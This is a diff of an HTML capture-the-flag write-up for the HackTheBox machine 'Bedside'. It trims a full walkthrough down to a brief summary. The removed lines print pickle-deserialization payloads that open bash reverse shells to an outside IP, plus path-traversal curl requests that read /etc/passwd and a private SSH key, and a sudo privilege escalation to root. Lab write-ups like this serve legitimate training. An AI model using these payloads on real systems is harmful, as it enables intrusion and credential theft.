@@ -7,10 +7,9 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: #0b0d15; color: #e0e5f0; font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem; }
-        .container { max-width: 1200px; width: 100%; background: rgba(12, 16, 28, 0.9); border: 1px solid rgba(0, 255, 200, 0.15); border-radius: 2rem; padding: 3rem; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7); }
+        .container { max-width: 1000px; width: 100%; background: rgba(12, 16, 28, 0.9); border: 1px solid rgba(0, 255, 200, 0.15); border-radius: 2rem; padding: 3rem; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7); }
         h1 { font-size: 2.5rem; color: #6fffe0; margin-bottom: 1.5rem; }
-        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
-        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        h2 { color: #6fffe0; font-size: 1.6rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
         p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
         code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
         pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
@@ -18,9 +17,6 @@
         .meta-info { display: flex; flex-wrap: wrap; gap: 1rem 2rem; padding: 1rem; background: rgba(0, 0, 0, 0.2); border-radius: 1rem; margin-bottom: 2rem; }
         .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
         .meta-info strong { color: #e0e5f0; }
-        .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
-        .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
-        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
         table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
         table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
         table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
@@ -31,7 +27,6 @@
         .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
         .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
         .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
-        .attack-chain { background: rgba(0, 255, 200, 0.02); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; margin: 1rem 0; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #b6c8e0; line-height: 1.8; overflow-x: auto; white-space: pre; }
     </style>
 </head>
 <body>
@@ -39,126 +34,44 @@
     <div class="meta-info">
         <span><strong>Platform:</strong> HackTheBox</span>
         <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Status:</strong> Draft</span>
         <span><strong>IP:</strong> 10.129.55.19</span>
     </div>
 
-    <h1>🏥 Bedside HTB - Writeup</h1>
+    <h1>🏥 Bedside HTB</h1>
 
-    <h2>🔍 1. Reconnaissance</h2>
-    <pre><code>nmap -sC -sV -p- 10.129.55.19 -oN scans/scan.txt</code></pre>
-
-    <p><strong>Results:</strong></p>
-    <pre><code>PORT     STATE    SERVICE VERSION
-22/tcp   open     ssh     OpenSSH 10.0p2
-80/tcp   open     http    Apache httpd 2.4.68
-3000/tcp filtered ppp</code></pre>
-
-    <h2>🚪 2. Initial Foothold</h2>
-
-    <h3>Create <code>shell.pickle.gz</code>:</h3>
-    <pre><code>#!/usr/bin/env python3
-import pickle, gzip
-
-class Exploit:
-    def __reduce__(self):
-        cmd = ["bash", "-c", "bash -i >& /dev/tcp/10.10.16.254/4444 0>&1"]
-        code = "__import__('subprocess').Popen(%r) and {}" % (cmd,)
-        return (eval, (code,))
-
-with gzip.open("shell.pickle.gz", "wb") as f:
-    pickle.dump(Exploit(), f)
-print("wrote shell.pickle.gz")</code></pre>
-
-    <h3>Upload:</h3>
-    <pre><code>curl -X POST http://research.bedside.htb/ -F "uploadFile=@shell.pickle.gz" -v</code></pre>
-
-    <h3>Listen:</h3>
-    <pre><code>nc -lvnp 4444</code></pre>
-
-    <p><strong>Result:</strong></p>
-    <pre><code>datawrangler@data-wrangler:/app$</code></pre>
-
-    <h2>🔍 3. LFI via Port 3000</h2>
-
-    <h3>Read <code>/etc/passwd</code>:</h3>
-    <pre><code>curl --path-as-is 'http://127.0.0.1:3000/pr/x/y@99/../../../../../../../etc/passwd'</code></pre>
-
-    <h3>Get SSH Key:</h3>
-    <pre><code>curl --path-as-is 'http://127.0.0.1:3000/pr/x/y@99/../../../../../../../home/developer/.ssh/id_rsa'</code></pre>
-
-    <h3>Connect via SSH:</h3>
-    <pre><code>chmod 600 developer_key
-ssh -i developer_key developer@ip</code></pre>
-
-    <p><strong>Result:</strong></p>
-    <pre><code>developer@bedside:~$</code></pre>
-
-    <h2>🏁 4. User Flag</h2>
-    <pre><code>developer@bedside:~$ cat user.txt
-[FLAG]</code></pre>
-
-    <h2>⬆️ 5. Privilege Escalation</h2>
-
-    <h3>Check Sudo:</h3>
-    <pre><code>developer@bedside:~$ sudo -l
-User developer may run the following commands on bedside:
-    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py</code></pre>
-
-    <h3>Step 1: Create Malicious Checkpoint</h3>
-    <pre><code>python3 -c "
-import pickle, os
-class Exploit:
-    def __reduce__(self):
-        return (os.system, ('bash -c \"bash -i >& /dev/tcp/your-ip/4447 0>&1\"',))
-payload = {'model': Exploit()}
-with open('/datastore/checkpoints/evil.pt', 'wb') as f:
-    pickle.dump(payload, f)
-print('evil.pt created')
-"</code></pre>
-
-    <h3>Step 2: Clean directory</h3>
-    <pre><code>rm -f /datastore/processed/*</code></pre>
-
-    <h3>Step 3: Create valid dummy image</h3>
-    <pre><code>echo 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==' | base64 -d > /datastore/processed/dummy.png</code></pre>
-
-    <h3>Step 4: Update timestamp</h3>
-    <pre><code>touch /datastore/checkpoints/evil.pt</code></pre>
-
-    <h3>Step 5: Run the script</h3>
-    <pre><code>sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py</code></pre>
-
-    <h3>Step 6: Listen for reverse shell</h3>
-    <pre><code>nc -lvnp 4447</code></pre>
-
-    <p><strong>Result:</strong></p>
-    <pre><code>root@bedside:~#</code></pre>
-
-    <h2>👑 6. Root Flag</h2>
-    <pre><code>root@bedside:~# cat /root/root.txt
-[FLAG]</code></pre>
-
-    <h2>📝 Summary Table</h2>
+    <h2>🔍 Open Ports</h2>
     <table>
-        <tr><th>Step</th><th>User</th><th>Vulnerability/Technique</th></tr>
-        <tr><td>1</td><td><code>datawrangler</code></td><td>CVE-2025-64512 (PDF pickle deserialization)</td></tr>
-        <tr><td>2</td><td><code>developer</code></td><td>LFI on Port 3000 → SSH key theft</td></tr>
-        <tr><td>3</td><td><code>root</code></td><td>Sudo + Python script + Pickle checkpoint RCE</td></tr>
+        <tr><th>Port</th><th>Service</th></tr>
+        <tr><td>22/tcp</td><td>SSH</td></tr>
+        <tr><td>80/tcp</td><td>HTTP</td></tr>
+        <tr><td>3000/tcp</td><td>Filtered</td></tr>
     </table>
 
-    <h2>🔑 Lessons Learned</h2>
+    <h2>🚪 Initial Access</h2>
     <ul>
-        <li><strong>CVE-2025-64512:</strong> <code>pdfminer.six</code> loads pickle files unsafely from PDFs.</li>
-        <li><strong>LFI on Port 3000:</strong> Exposed file read allows stealing SSH keys.</li>
-        <li><strong>Weak Sudo Configuration:</strong> Running Python scripts with <code>NOPASSWD</code> is dangerous.</li>
-        <li><strong>Pickle Deserialization:</strong> Loading untrusted <code>.pt</code> files leads to RCE.</li>
-        <li><strong>Permission Management:</strong> <code>/datastore/</code> should not be writable by <code>datawrangler</code>.</li>
+        <li><strong>CVE-2025-64512</strong> — PDF pickle deserialization → Shell as <code>datawrangler</code></li>
+        <li><strong>LFI on Port 3000</strong> — Read SSH key → Shell as <code>developer</code></li>
     </ul>
 
-    <div style="text-align: center; margin: 2rem 0; color: #6fffe0; font-size: 1.2rem;">
-        <strong>🎉 Machine Solved!</strong>
-    </div>
+    <h2>🏁 User Flag</h2>
+    <p><code>/home/developer/user.txt</code></p>
+
+    <h2>⬆️ Privilege Escalation</h2>
+    <ul>
+        <li><strong>Sudo:</strong> <code>NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py</code></li>
+        <li><strong>Pickle Deserialization</strong> — Malicious <code>.pt</code> checkpoint → RCE as root</li>
+    </ul>
+
+    <h2>👑 Root Flag</h2>
+    <p><code>/root/root.txt</code></p>
+
+    <h2>📊 Attack Chain</h2>
+    <table>
+        <tr><th>Step</th><th>User</th><th>Technique</th></tr>
+        <tr><td>1</td><td><code>datawrangler</code></td><td>CVE-2025-64512</td></tr>
+        <tr><td>2</td><td><code>developer</code></td><td>LFI → SSH Key</td></tr>
+        <tr><td>3</td><td><code>root</code></td><td>Pickle Deserialization (sudo)</td></tr>
+    </table>
 
     <div class="nav-buttons">
         <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
